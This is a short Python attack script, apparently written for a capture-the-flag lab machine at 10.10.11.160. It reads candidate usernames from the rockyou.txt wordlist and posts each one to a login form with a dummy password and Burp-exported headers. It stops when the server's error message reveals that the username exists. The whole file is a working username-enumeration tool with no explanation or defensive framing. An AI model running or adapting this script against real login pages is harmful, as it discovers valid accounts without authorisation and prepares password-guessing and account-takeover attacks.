import requests

def req(user):
	burp0_url = "http://10.10.11.160:5000/login"
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.10.11.160:5000", "Connection": "close", "Referer": "http://10.10.11.160:5000/login", "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"username": user, "password": "asdasdasdasdasdasdas"}
	r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
	return r.text

with open("rockyou.txt") as f:
	for user in f:
		print(f"[-] Try user {user.strip()}")
		response = req(user.strip())
		if "Invalid login" in response:
			print(f"[+] USER FOUND: {user.strip()}")
			break